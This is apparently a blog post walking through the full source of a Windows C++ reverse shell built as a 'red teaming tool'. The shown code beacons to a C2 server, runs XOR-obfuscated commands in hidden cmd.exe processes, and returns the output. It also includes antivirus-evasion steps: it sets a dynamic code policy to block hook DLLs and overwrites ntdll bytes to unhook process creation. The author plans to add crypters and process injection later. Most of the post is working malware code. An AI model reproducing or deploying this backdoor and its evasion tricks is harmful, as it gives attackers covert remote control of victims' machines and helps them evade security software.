layout: post
title: "C++ Reverse Shell"
date: 2022-06-13 8:16:46 -0000
categories: Reverse-Shell, C++, obfuscation

### C++ Reverse Shell : Blog posting 0

My last C++ project was quite a while ago, and it was really quite bad, so I was looking to make a red teaming tool that is extensible. Something I could continually pile on features to such as building a crypter for the program, injecting the bytes into another process, and all that other fun stuff that malware authors tend to implement. However for now, I was simply focused on building out the core functionality, mostly. Ideally, the goal was to include at least some very, very light network obfuscation (don't want command-line banners busting me) and unhooking CreateProcessA. 

To start, we'll init some global variable, namespaces, and libraries:

```
#include <WinSock2.h>
#include <string>
#include <cstdio>
#include <Windows.h>
#include <ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")

#define BUF_LEN 4096


using namespace std;

HANDLE STDIN_RD, STDIN_WR;
HANDLE STDOUT_RD, STDOUT_WR;
HANDLE STDERR_RD, STDERR_WR;
SECURITY_ATTRIBUTES seca;
SOCKET sock;
STARTUPINFOA sinfo;
PROCESS_INFORMATION pinfo;

struct addrinfo hints, * res = NULL, * ptr = NULL;

int sizer = 0;

void setupPipe(void);
void initsock(void);
void createProc(string cmdarr);
```
(Now, global variables are considered bad practice due to them being open to being re-write at any time, making it quite easy to lose track of what is altering the value of the globals in more complex projects. For this reason, the program will be getting re-organized down the line. Especially since this is more or so a first draft.)

The libraries that are absolutely required are WinSock2, Windows, and ws2tcpip. The #pragma comment simply gives a directive to the compiler to link it as an additional library within MSVC. BUF_LEN is defined with 4096, the buffer size we will be using for network/IPC communication. The socket is declared, as well as three structures required for calling CreateProcessA.


Another structure, addrinfo is defined which we be required for initializing the socket. A few functions are declared here as well, one being a global counter used by the XOR function that's defined later on. Again, this is bad structuring and will be refactored.

The initsock() function is the firs called in main(), so let's go over that first:

```
{
	int iresult = 0;
	bool bresult = FALSE;
	char C2Server[] = { "127.0.0.1" };
	char C2Port[] = { "8999" };



	//init vars - zero mem of struct that will contain networking information
	sock = INVALID_SOCKET;
	WSADATA wsadat;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	//init wsa - err check
	iresult = WSAStartup(MAKEWORD(2, 2), &wsadat);
	if (iresult != 0)
	{
		printf("WSA startup failed: %d\n", iresult);
	}



	//resolve dns - err check
	iresult = getaddrinfo(C2Server, C2Port, &hints, &res);
	if (iresult != 0)
	{
		printf("GetAddr failed: %d\n", iresult);
		WSACleanup();
	}

	//Create socket for connectin to server and err check
	ptr = res;
	sock = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, 0, 0, 0);

	if (sock == INVALID_SOCKET)
	{
		printf("Error at socket call: %ld\n", WSAGetLastError());
		freeaddrinfo(res);
		WSACleanup();
	}
	else
	{
		char welcome[] = "[+] HELLO XSGEN";
		XOR(welcome, strlen(welcome));



		for (;;)
		{
			int r = connect(sock, ptr->ai_addr, ptr->ai_addrlen);
			if (r == 0) break;
		}
		send(sock, welcome, sizeof(welcome) - 1, 0);
	}
  ```
  
  
Some variables are defined within the function, most importantly the IP and port of our C2 server. Next the WSADATA, SOCKET, and hints structure. We use the
WSADATA struct declared and pass it into WSAStartup() to initialize winsock (windows socket I/O handler). Getaddrinfo()'s role is to resolve host names from ANSI text, and the results are pushed to the res addrinfo struct. Using an additional ptr variable for handling the address info is primarily a relic of the design process and will likely be removed later on, but for now we will use it to access address information. So, with that done, we can call WSAsocketW() and use it to define our socket then check for errors. If all goes well, then the for loop will continue until a successful connection is made. A welcome message is sent upon success, how warm, right? 

Main() up to this point looks something like this:

```
int main()
{	

	//Defense
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dcp = {};
	dcp.ProhibitDynamicCode = 1;
	SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &dcp, sizeof(dcp));

	WriteProcessMemory(GetCurrentProcess(), GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateUserProcess"), "\0x4C\0x8B\0xD1\0xB8", 5, NULL);
	

	start:

	char buf[BUF_LEN];
	
	
	// Startup sock and WSA
	
	initsock();
  
  .... more code ....
}
  ```
  
The PROCESS_MITIGATION_DYNAMIC_CODE_POLICY is required as a parameter setting mitigation policies. Setting the dynamic code policy, also known as ACG has two primary affects.

>With ACG enabled, the Windows kernel prevents a content process from creating and modifying code pages in memory by enforcing the following policy: Code pages are immutable and prevents new unsigned code pages from being created.

After Microsoft's long war with TDL-1/2/3, they introduced their code signing policy. Now, core components of the OS only run code signed by microsoft, which does not happen to include code produced by AV. This effectively puts AV vendors in userland, right along with us, and so this protection prevents the installation of hooks via AVs injecting their DLLs. Then, the correct bytes for the beginning of CreateProcessA are rewritten to unhook it as well. This is redundant, but it's included for the sake of this being an exploratory project.

One of the larger obstacles was the implementation of light network obfuscation, which was achieved by creating a process for every command, reading it from a pipe, encrypting it, then sending the result off. More basic reverse shells simply send all and receive all I/O for the process through the socket. That would look something like this:

```
sinfo.hStdError = (HANDLE)sock
sinfo.hStdOutput = (HANDLE)sock
sinfo.hStdInput = (HANDLE)sock

```

However this doesn't allow for modification of I/O before it's sent and received, so the aforementioned implementation of creating a process for every command is used instead. First, the process must be created:

```
void createProc(string cmdarr)
{
	procstart:

	ZeroMemory(&sinfo, sizeof(STARTUPINFOA));
	ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
	sinfo.cb = sizeof(STARTUPINFOA);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	setupPipe();

	
```

First, we zero out the STARTUPINFOA and PROCESS_INFORMATION structs and define a few required fields. One of important notice is sinfo.dwFlags as we instruct the created process to use STD handles (makes I/O redirection possible) and to hide the window produced by the process. We also call setuppipe(), which looks like so:

```
void setupPipe()
{
	start:

	ZeroMemory(&seca, sizeof(SECURITY_ATTRIBUTES));
	seca.nLength = sizeof(SECURITY_ATTRIBUTES);
	seca.bInheritHandle = TRUE;
	seca.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&STDOUT_RD, &STDOUT_WR, &seca, BUF_LEN))
	{
		goto start;
	}

	if (!SetHandleInformation(STDOUT_RD, HANDLE_FLAG_INHERIT, 0))
	{
		//send err;
		goto start;
	}

	if (!CreatePipe(&STDIN_RD, &STDIN_WR, &seca, BUF_LEN))
	{
		goto start;
	}

	if (!SetHandleInformation(STDIN_WR, HANDLE_FLAG_INHERIT, 0))
	{
		goto start;
	}
	if (!CreatePipe(&STDERR_RD, &STDERR_WR, &seca, BUF_LEN))
	{
		goto start;
	}
	if (!SetHandleInformation(STDERR_RD, HANDLE_FLAG_INHERIT, 0))
	{
		goto start;
	}
	
}
```

We prepare the SECURITY_ATTRIBUTES by defining some important fields. Handles must be inherited from the createdprocess, so it's set to true. What follows is the functions required to setup the IPC pipes the created process will be using. Now we can continue with the function which creates the process.

```
void createProc(string cmdarr)
{
	procstart:

	ZeroMemory(&sinfo, sizeof(STARTUPINFOA));
	ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
	sinfo.cb = sizeof(STARTUPINFOA);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	setupPipe();

	sinfo.hStdError = STDERR_WR;
	sinfo.hStdOutput = STDOUT_WR;
	sinfo.hStdInput = STDIN_RD;
	
	string cmdpre = "/C " + cmdarr;
	
	char* arg = &cmdpre[0];

	if (cmdarr == "0")
	{
		
		CreateProcessA("C:\\WINDOWS\\SYSTEM32\\CMD.EXE", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
	}
	else
	{
		bool ret = CreateProcessA("C:\\WINDOWS\\SYSTEM32\\CMD.EXE", arg, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
		if (ret = 0)
		{
			char err[] = "Process creation error";
			char errcode[] = { GetLastError() };
			send(sock, err, sizeof(err), 0);
			send(sock, errcode, sizeof(errcode), 0);
		}
	}

	WaitForSingleObject(pinfo.hProcess, INFINITE);

	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);


	CloseHandle(STDOUT_WR);
	CloseHandle(STDERR_WR);
}
```

Now, the pipes we just set up are assigned to the sinfo STD handles which, well, handle the I/O of the created process. After such, the string parameter is turned into an array and passed into CreateProcessA(). Closing the handles is of utmost importance- if this step is skipped, attempting to read from the pipe will just hang. All that's left is to receive data in main() over the socket, parse it, and then execute it as a command, within a loop. 

```
void XOR(char dat[], int size)
{
	char k = 'x';

	for (int i = 0; i < size; i++)
	{
		dat[i] = dat[i] ^ k;
	}
	sizer = sizeof(dat);
}


int main()
{	

	//Defense
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dcp = {};
	dcp.ProhibitDynamicCode = 1;
	SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &dcp, sizeof(dcp));

	WriteProcessMemory(GetCurrentProcess(), GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateUserProcess"), "\0x4C\0x8B\0xD1\0xB8", 5, NULL);
	

	start:

	char buf[BUF_LEN];
	
	
	// Startup sock and WSA
	
	initsock();

	//cmd startup 
	zero:
	string cmdDefault = "0";
	string cmd;
	int len;
	int index = 0;
	
	while (1)
	{
		
		ZeroMemory(&buf, BUF_LEN);

		len = recv(sock, buf, BUF_LEN, 0);
		XOR(buf, strlen(buf));
		cmd = buf;
		if (string(cmd).substr(0,1) == "0")
		{
			closesocket(sock);
			WSACleanup();

			initsock();
			ZeroMemory(&buf, BUF_LEN);
			recv(sock, buf, BUF_LEN, 0);
			cmd.erase();
			cmd = buf;
		}
		

		createProc(cmd);
		
		 
		

		for (;;)
		{
			bool bcode = FALSE;
			DWORD dwRead, dwWritten;
			string result = "";
			char* arr;

			// Rd from pipe and send to 
			bcode = ReadFile(STDOUT_RD, buf, BUF_LEN, &dwRead, NULL);
			if (!bcode || dwRead == 0) break;
			
			XOR(buf, strlen(buf));
			send(sock, buf,	dwRead, 0);
		}

		ZeroMemory(&buf, BUF_LEN);

		for (;;)
		{
			bool bcode = FALSE;
			DWORD dwRead, dwWritten;
			string result = "";
			char* arr;

			// Rd from pipe and send to 
			bcode = ReadFile(STDERR_RD, buf, BUF_LEN, &dwRead, NULL);
			if (!bcode || dwRead == 0) break;

			XOR(buf, strlen(buf));
			send(sock, buf, dwRead, 0);
		}

		
	}
}

```

Here, a small XOR function is used to parse the data received, then it's passed over to the process creation function as long as it does not decrypt to a '0'. If it does, then it shuts down the socket, initializes it again, and goes back to beaconing out to the C2 server. Otherwise, it's passed to aformentioned function. After reading from both the STD error and STD output pipes, it passes the result along to the C2 and the cycle begins anew.
